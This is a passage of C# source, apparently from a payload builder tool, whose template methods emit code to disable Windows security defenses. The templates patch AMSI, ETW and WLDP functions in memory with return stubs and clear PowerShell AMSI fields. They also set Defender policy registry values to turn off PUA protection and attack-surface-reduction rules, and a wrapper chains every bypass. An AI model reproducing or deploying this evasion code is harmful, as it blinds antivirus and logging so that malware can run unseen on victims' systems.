                byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax, 0x80070057; ret
                PatchMemory(amsiScanBuffer, patch);
            }
        }
        IntPtr amsiInitialize = GetProcAddress(amsiDll, ""AmsiInitialize"");
        if (amsiInitialize != IntPtr.Zero)
        {
            byte[] patch = { 0xC2, 0x18, 0x00 }; // ret 18h
            PatchMemory(amsiInitialize, patch);
        }
        var amsiUtils = Type.GetType(""System.Management.Automation.AmsiUtils"");
        if (amsiUtils != null)
        {
            var amsiContextField = amsiUtils.GetField(""amsiContext"", BindingFlags.NonPublic | BindingFlags.Static);
            if (amsiContextField != null)
                amsiContextField.SetValue(null, IntPtr.Zero);
            
            var amsiSessionField = amsiUtils.GetField(""amsiSession"", BindingFlags.NonPublic | BindingFlags.Static);
            if (amsiSessionField != null)
                amsiSessionField.SetValue(null, IntPtr.Zero);
        }
        var amsiInitFailed = Type.GetType(""System.Management.Automation.AmsiUtils"");
        if (amsiInitFailed != null)
        {
            var amsiInitFailedField = amsiInitFailed.GetField(""amsiInitFailed"", BindingFlags.NonPublic | BindingFlags.Static);
            if (amsiInitFailedField != null)
                amsiInitFailedField.SetValue(null, true);
        }

    }
    catch { }
}

[System.Runtime.InteropServices.DllImport(""kernel32.dll"")]
static extern IntPtr LoadLibrary(string lpFileName);

[System.Runtime.InteropServices.DllImport(""kernel32.dll"")]
static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

[System.Runtime.InteropServices.DllImport(""kernel32.dll"")]
static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

static void PatchMemory(IntPtr address, byte[] patch)
{
    try
    {
        uint oldProtect;
        VirtualProtect(address, (UIntPtr)patch.Length, 0x40, out oldProtect); // PAGE_EXECUTE_READWRITE
        System.Runtime.InteropServices.Marshal.Copy(patch, 0, address, patch.Length);
        VirtualProtect(address, (UIntPtr)patch.Length, oldProtect, out oldProtect);
    }
    catch { }
}
";
        }

        static string ETWBypassTemplate()
        {
            return @"
static void BypassETW()
{
    try
    {
        IntPtr ntdll = LoadLibrary(""ntdll.dll"");
        if (ntdll != IntPtr.Zero)
        {
            IntPtr etwEventWrite = GetProcAddress(ntdll, ""EtwEventWrite"");
            if (etwEventWrite != IntPtr.Zero)
            {
                byte[] patch = { 0xC3 }; // ret
                PatchMemory(etwEventWrite, patch);
            }
            IntPtr etwEventWriteFull = GetProcAddress(ntdll, ""EtwEventWriteFull"");
            if (etwEventWriteFull != IntPtr.Zero)
            {
                byte[] patch = { 0xC3 }; // ret
                PatchMemory(etwEventWriteFull, patch);
            }
            IntPtr etwEventWriteTransfer = GetProcAddress(ntdll, ""EtwEventWriteTransfer"");
            if (etwEventWriteTransfer != IntPtr.Zero)
            {
                byte[] patch = { 0xC3 }; // ret
                PatchMemory(etwEventWriteTransfer, patch);
            }
            IntPtr etwEventWriteEx = GetProcAddress(ntdll, ""EtwEventWriteEx"");
            if (etwEventWriteEx != IntPtr.Zero)
            {
                byte[] patch = { 0xC3 }; // ret
                PatchMemory(etwEventWriteEx, patch);
            }
        }

        var etwProviderType = Type.GetType(""System.Diagnostics.Tracing.EventSource"");
        if (etwProviderType != null)
        {
            var etwProviderField = etwProviderType.GetField(""s_etwProvider"", BindingFlags.NonPublic | BindingFlags.Static);
            if (etwProviderField != null)
                etwProviderField.SetValue(null, null);
        }

        try
        {
            using (var eventLog = new System.Diagnostics.EventLog(""Application""))
            {
                eventLog.Source = ""Application"";
            }
        }
        catch { }

    }
    catch { }
}
";
        }

        static string WLDPBypassTemplate()
        {
            return @"
static void BypassWLDP()
{
    try
    {
        IntPtr wldpDll = LoadLibrary(""wldp.dll"");
        if (wldpDll != IntPtr.Zero)
        {
            IntPtr wldpQueryDynamicCodeTrust = GetProcAddress(wldpDll, ""WldpQueryDynamicCodeTrust"");
            if (wldpQueryDynamicCodeTrust != IntPtr.Zero)
            {
                byte[] patch = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 }; // mov eax, 0; ret
                PatchMemory(wldpQueryDynamicCodeTrust, patch);
            }


            IntPtr wldpIsDynamicCodePolicyEnabled = GetProcAddress(wldpDll, ""WldpIsDynamicCodePolicyEnabled"");
            if (wldpIsDynamicCodePolicyEnabled != IntPtr.Zero)
            {
                byte[] patch = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 }; // mov eax, 0; ret
                PatchMemory(wldpIsDynamicCodePolicyEnabled, patch);
            }

            IntPtr wldpQueryDeviceSecurityPolicy = GetProcAddress(wldpDll, ""WldpQueryDeviceSecurityPolicy"");
            if (wldpQueryDeviceSecurityPolicy != IntPtr.Zero)
            {
                byte[] patch = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 }; // mov eax, 0; ret
                PatchMemory(wldpQueryDeviceSecurityPolicy, patch);
            }
        }

        try
        {
            using (var key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@""SOFTWARE\Policies\Microsoft\Windows Defender""))
            {
                key.SetValue(""PUAProtection"", 0, Microsoft.Win32.RegistryValueKind.DWord);
            }

            using (var key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@""SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR""))
            {
                key.SetValue(""ExploitGuard_ASR_Rules"", 0, Microsoft.Win32.RegistryValueKind.DWord);
            }
        }
        catch { }

        try
        {
            var securityManagerType = Type.GetType(""System.Security.SecurityManager"");
            if (securityManagerType != null)
            {
                var policyChangedField = securityManagerType.GetField(""_policyChanged"", BindingFlags.NonPublic | BindingFlags.Static);
                if (policyChangedField != null)
                    policyChangedField.SetValue(null, true);
            }
        }
        catch { }

    }
    catch { }
}
";
        }

        static string FullMemoryProtectionBypassTemplate()
        {
            return @"
static void BypassAllMemoryScans()
{
    try
    {
        BypassAMSI();
        System.Threading.Thread.Sleep(100);
        
        BypassETW();
        System.Threading.Thread.Sleep(100);
        
        BypassWLDP();
        System.Threading.Thread.Sleep(100);

        BypassCLR();
        BypassScriptBlockLogging();
       
        VerifyBypasses();
    }
    catch { }
}

static void BypassCLR()
{
    try
    {
        var securityManagerType = Type.GetType(""System.Security.SecurityManager"");
        if (securityManagerType != null)
        {
            var securityEnabledField = securityManagerType.GetField(""_securityEnabled"", BindingFlags.NonPublic | BindingFlags.Static);
            if (securityEnabledField != null)
                securityEnabledField.SetValue(null, false);
        }
        var jitHelpersType = Type.GetType(""System.Runtime.CompilerServices.JitHelpers"");
        if (jitHelpersType != null)
        {
            var unsafeCastMethod = jitHelpersType.GetMethod(""UnsafeCast"", BindingFlags.NonPublic | BindingFlags.Static);
        }
    }
    catch { }
}

static void BypassScriptBlockLogging()
{
    try
    {
        var powerShellAssembly = AppDomain.CurrentDomain.GetAssemblies()
            .FirstOrDefault(a => a.GetName().Name == ""System.Management.Automation"");
            
        if (powerShellAssembly != null)
        {
            var scriptBlockType = powerShellAssembly.GetType(""System.Management.Automation.ScriptBlock"");
            if (scriptBlockType != null)
            {
                var shouldLogMethod = scriptBlockType.GetMethod(""GetShouldLog"", BindingFlags.NonPublic | BindingFlags.Static);
                if (shouldLogMethod != null)
                {
                }
            }
        }
    }
    catch { }
}

static void VerifyBypasses()
{
    try
    {
    }
    catch { }
}
";
        }
        #endregion

        private void checkBox3_CheckedChanged(object sender, EventArgs e)
        {

        }
    }
}
